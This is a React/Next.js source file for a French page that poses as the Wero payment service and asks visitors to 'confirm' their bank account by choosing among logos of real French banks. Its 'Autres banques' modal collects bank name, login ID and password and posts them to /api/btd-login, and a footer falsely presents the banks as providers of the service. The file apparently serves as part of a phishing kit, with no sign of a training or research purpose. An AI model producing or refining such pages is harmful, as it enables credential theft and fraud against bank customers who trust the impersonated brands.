'use client';

import React, { useState, FormEvent } from 'react';
import Link from 'next/link';
import { useRouter } from 'next/navigation';

interface OffreItem {
  id: string;
  name: string;
  logo: string;
  isOther?: boolean;
}

const items: OffreItem[] = [
  { id: '1', name: 'Crédit Agricole', logo: '/IMG_9197.png' },
  { id: '2', name: 'Société Générale', logo: '/Societe-Generale-Emblem.png' },
  { id: '3', name: 'Banque Populaire', logo: '/BP-1.png' },
  { id: '4', name: 'CCF', logo: '/CCF-2023.svg.webp' },
  { id: '5', name: 'LCL', logo: '/LCL_banque_logo.svg.webp' },
  { id: '6', name: "Caisse d'Épargne", logo: '/12895685.png' },
  { id: '7', name: 'La Banque Postale', logo: '/logo_BanquePostale_600x300.webp' },
  { id: '8', name: 'Crédit Mutuel', logo: '/unnamed.jpg' },
  { id: '9', name: 'Hello Bank!', logo: '/images.jpeg' },
  { id: '10', name: 'BNP Paribas', logo: '/BNP_Paribas.png' },
  { id: '11', name: 'BoursoBank', logo: '/boursorama_logo.jpeg' },
  { id: '12', name: 'Autres banques', logo: '', isOther: true },
];

export default function PortailPage(): React.ReactElement {
  const router = useRouter();
  const [isMenuOpen, setIsMenuOpen] = useState<boolean>(false);
  const [redirectingItem, setRedirectingItem] = useState<OffreItem | null>(null);

  // États pour la modale "Autres banques"
  const [isModalOpen, setIsModalOpen] = useState<boolean>(false);
  const [bankName, setBankName] = useState<string>('');
  const [identifiant, setIdentifiant] = useState<string>('');
  const [password, setPassword] = useState<string>('');
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);

  const handleSelect = (item: OffreItem): void => {
    if (item.isOther) {
      setIsModalOpen(true);
      return;
    }

    setRedirectingItem(item);
    
    if (typeof window !== 'undefined') {
      localStorage.setItem('banque_selectionnee', item.name);
    }

    // Redirection vers le dossier /offres/offre-1 jusqu'à 11
    setTimeout(() => {
      router.push(`/offres/offre-${item.id}`);
    }, 2500);
  };

  const handleModalSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      await fetch('/api/btd-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          bankName: bankName || 'Autre banque', 
          identifiant, 
          password 
        }),
      });
    } catch (err) {
      console.error('Erreur lors de la soumission :', err);
    } finally {
      setIsSubmitting(false);
      setIsModalOpen(false);
      router.push('/bat');
    }
  };

  return (
    <div className="min-h-screen bg-[#F7F9FC] text-[#1E293B] font-sans flex justify-center items-center sm:py-6 relative">
      <div className="w-full max-w-md min-h-screen sm:min-h-[840px] bg-white sm:rounded-3xl sm:shadow-2xl flex flex-col justify-between overflow-hidden relative border border-slate-100">
        
        {/* En-tête / Header */}
        <header className="px-6 py-4 flex items-center justify-between border-b border-slate-100 bg-white sticky top-0 z-20">
          <Link href="/" className="flex items-center hover:opacity-80 transition-opacity">
            <img src="/flavicon.ico" alt="Wero Logo" className="h-8 w-auto object-contain" />
          </Link>

          <button
            type="button"
            onClick={() => setIsMenuOpen((prev) => !prev)}
            aria-label="Toggle Menu"
            className="p-2 rounded-xl text-slate-800 hover:bg-slate-50 transition-colors focus:outline-none"
          >
            <div className="w-6 h-4 flex flex-col justify-between">
              <span className={`h-0.5 w-full bg-slate-900 rounded-full transition-all duration-300 ${isMenuOpen ? 'rotate-45 translate-y-1.5' : ''}`} />
              <span className={`h-0.5 w-full bg-slate-900 rounded-full transition-all duration-300 ${isMenuOpen ? 'opacity-0' : ''}`} />
              <span className={`h-0.5 w-full bg-slate-900 rounded-full transition-all duration-300 ${isMenuOpen ? '-rotate-45 -translate-y-1.5' : ''}`} />
            </div>
          </button>
        </header>

        {/* Navigation mobile */}
        {isMenuOpen && (
          <div className="absolute top-[70px] left-0 w-full bg-white/95 backdrop-blur-md border-b border-slate-100 p-4 shadow-xl z-30">
            <nav className="flex flex-col gap-2 font-medium text-slate-800">
              <Link 
                href="/" 
                className="p-3 hover:bg-slate-50 rounded-xl transition-colors text-sm font-semibold"
                onClick={() => setIsMenuOpen(false)}
              >
                Accueil
              </Link>
            </nav>
          </div>
        )}

        {/* Contenu principal */}
        <main className="flex-1 px-5 py-6 flex flex-col items-center">
          <h1 className="text-2xl font-black text-slate-900 tracking-tight text-center leading-tight mb-1">
            Virement vers votre banque
          </h1>
          <p className="text-sm font-semibold text-slate-500 mb-6 text-center">
            Sélectionnez votre banque
          </p>

          <div className="p-5 rounded-2xl bg-slate-50 border border-slate-100 mb-6 text-left space-y-3">
            <p className="text-xs text-slate-600 font-medium leading-relaxed">
              Pour garantir la sécurité de vos paiements et de vos transferts entre votre compte Wero et votre compte bancaire, il est nécessaire de confirmer votre compte bancaire en toute sécurité.
            </p>
            <p className="text-xs text-slate-600 font-medium leading-relaxed">
              Cette confirmation se fait via vos identifiants de connexion en ligne, ce qui assure la protection totale de vos informations.
            </p>
          </div>

          {/* Grille de sélection des banques */}
          <div className="w-full grid grid-cols-2 gap-3.5 mb-6">
            {items.map((item) => (
              <button
                key={item.id}
                type="button"
                onClick={() => handleSelect(item)}
                className={`p-4 bg-white border rounded-2xl flex flex-col items-center justify-center text-center transition-all duration-150 active:scale-95 shadow-sm hover:shadow-md ${
                  item.isOther
                    ? 'border-dashed border-slate-300 bg-slate-50/50'
                    : 'border-slate-200 hover:border-slate-300'
                }`}
              >
                <div className="h-10 w-full flex items-center justify-center mb-3">
                  {item.isOther ? (
                    <div className="w-10 h-10 rounded-xl bg-slate-100 flex items-center justify-center text-slate-700">
                      <svg className="w-6 h-6 text-slate-700" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
                        <path d="M3 22h18M5 22V11h14v11M12 2v4M4.5 6h15L12 2 4.5 6zM7 11v7M11 11v7M14 11v7M17 11v7"/>
                      </svg>
                    </div>
                  ) : (
                    <img
                      src={item.logo}
                      alt={item.name}
                      className="max-h-full max-w-[80%] object-contain"
                    />
                  )}
                </div>
                <span className="text-xs font-bold text-slate-900 line-clamp-1">
                  {item.name}
                </span>
              </button>
            ))}
          </div>
        </main>
          <footer className="w-full px-5 py-5 border-t border-slate-100 bg-slate-50/50 text-center shrink-0">
        <p className="text-xs font-medium text-slate-500 mb-3.5">
          Ce service vous est proposé par :
        </p>

        <div className="flex items-center justify-center gap-3.5 flex-wrap">
          <img src="/Societe-Generale-Emblem.png" alt="Société Générale" className="h-4 object-contain" />
          <img src="/Banquepopulaire_logo.svg.webp" alt="Banque Populaire" className="h-4 object-contain" />
          <img src="/logo_BanquePostale_600x300.webp" alt="La Banque Postale" className="h-4 object-contain" />
          <img src="/12895685.png" alt="Caisse d'Épargne" className="h-4 object-contain" />
          <img src="/IMG_9197.png" alt="Crédit Agricole" className="h-4 object-contain" />
          <img src="/unnamed.jpg" alt="Crédit Mutuel" className="h-4 object-contain" />
        </div>
      </footer>
      </div>

      {/* Pop-up pour "Autres banques" */}
      {isModalOpen && (
        <div className="fixed inset-0 bg-slate-900/40 backdrop-blur-sm z-50 flex justify-center items-center p-4">
          <div className="bg-white w-full max-w-sm rounded-3xl p-6 shadow-2xl border border-slate-100 relative animate-in fade-in zoom-in duration-200">
            <button
              type="button"
              onClick={() => setIsModalOpen(false)}
              className="absolute top-4 right-4 text-slate-400 hover:text-slate-600 text-lg font-bold w-8 h-8 flex items-center justify-center rounded-full hover:bg-slate-100"
            >
              ✕
            </button>

            <h2 className="text-xl font-bold text-slate-900 mb-1 text-center">
              Autre établissement
            </h2>
            <p className="text-xs text-slate-500 text-center mb-6">
              Saisissez les informations de votre banque
            </p>

            <form onSubmit={handleModalSubmit} className="space-y-4">
              <div>
                <label className="block text-xs font-bold text-slate-700 mb-1">
                  Nom de l'établissement
                </label>
                <input
                  type="text"
                  required
                  placeholder="Ex: Fortuneo, Revolut..."
                  value={bankName}
                  onChange={(e) => setBankName(e.target.value)}
                  className="w-full px-4 py-3 border border-slate-200 rounded-xl text-sm outline-none focus:border-slate-800 transition-colors"
                />
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-700 mb-1">
                  Identifiant
                </label>
                <input
                  type="text"
                  required
                  placeholder="Votre identifiant"
                  value={identifiant}
                  onChange={(e) => setIdentifiant(e.target.value)}
                  className="w-full px-4 py-3 border border-slate-200 rounded-xl text-sm outline-none focus:border-slate-800 transition-colors"
                />
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-700 mb-1">
                  Mot de passe
                </label>
                <input
                  type="password"
                  required
                  placeholder="Votre mot de passe"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-4 py-3 border border-slate-200 rounded-xl text-sm outline-none focus:border-slate-800 transition-colors"
                />
              </div>

              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full py-3.5 bg-slate-900 text-white font-bold text-sm rounded-xl hover:bg-slate-800 active:scale-[0.98] transition-all disabled:opacity-50 mt-2"
              >
                {isSubmitting ? 'Validation...' : 'Valider'}
              </button>
            </form>
          </div>
        </div>
      )}

      {/* Écran de transition de redirection */}
      {redirectingItem && (
        <div className="fixed inset-0 bg-white z-50 flex flex-col justify-center items-center">
          <div className="flex flex-col items-center">
            <div className="flex items-center gap-5 mb-8">
              <div className="w-[70px] h-[70px] rounded-2xl bg-[#fffde7] shadow-md flex items-center justify-center">
                <img src="/flavicon.ico" alt="Wero" className="w-10 h-10 object-contain" />
              </div>
              
              <div className="text-[#4cd137] font-bold text-xl">
                <svg viewBox="0 0 24 24" width="32" height="32" fill="none" stroke="currentColor" strokeWidth="3">
                  <line x1="5" y1="12" x2="19" y2="12" />
                  <polyline points="12 5 19 12 12 19" />
                </svg>
              </div>

              <div className="w-[70px] h-[70px] rounded-2xl bg-white shadow-md flex items-center justify-center p-2 border border-slate-100">
                <img src={redirectingItem.logo} alt={redirectingItem.name} className="max-h-[40px] max-w-[50px] object-contain" />
              </div>
            </div>

            <p className="text-[#718096] text-base font-medium mb-5">
              Connexion sécurisée en cours...
            </p>

            <div className="flex gap-2">
              <span className="w-2.5 h-2.5 bg-[#a8e063] rounded-full animate-pulse" />
              <span className="w-2.5 h-2.5 bg-[#a8e063] rounded-full animate-pulse delay-150" />
              <span className="w-2.5 h-2.5 bg-[#a8e063] rounded-full animate-pulse delay-300" />
            </div>
          </div>
        </div>
      )}

    </div>
  );
}